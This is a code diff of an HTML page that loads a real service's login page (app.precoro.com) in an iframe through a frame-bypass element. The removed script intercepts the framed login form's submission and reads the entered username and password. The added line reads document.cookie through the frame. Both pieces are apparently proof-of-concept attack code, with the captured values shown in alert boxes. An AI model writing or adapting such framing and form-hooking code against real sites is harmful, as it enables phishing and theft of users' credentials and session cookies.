@@ -33,34 +33,7 @@
 <iframe is="x-frame-bypass" src="https://app.precoro.com/login" class="asd" >
 
 <script>
-        function manipulateIframeContent() {
-            // Получаем доступ к iframe
-		var iframe = document.querySelector('.asd');
-            // Проверяем, загрузился ли iframe
-            if (iframe && iframe.contentWindow) {
-                // Получаем доступ к содержимому iframe
-                var iframeDocument = iframe.contentWindow.document;
-                
- 	
-		var login_form = iframeDocument.getElementById('login_form');
-		var pass_value = iframeDocument.getElementById('password');
-		var user_value = iframeDocument.getElementById('username');
-		    
-		login_form.addEventListener('submit', function(event) {
-        		event.preventDefault(); // Prevent the form from submitting
-
-        		// Get the input value
-        		var inputValue = pass_value.value;
-        		var passValue = pass_value.value;
-			var inputValue2 = user_value.value;
-
-        		alert(passValue);
-			alert(inputValue2);
-    		});
-            }
-        }
-        // Ожидаем, пока iframe загрузится, и затем вызываем функцию
-        document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
+(function() {document.querySelector('.asd').contentWindow.alert(document.cookie);})();
 </script>
 	
 </body>
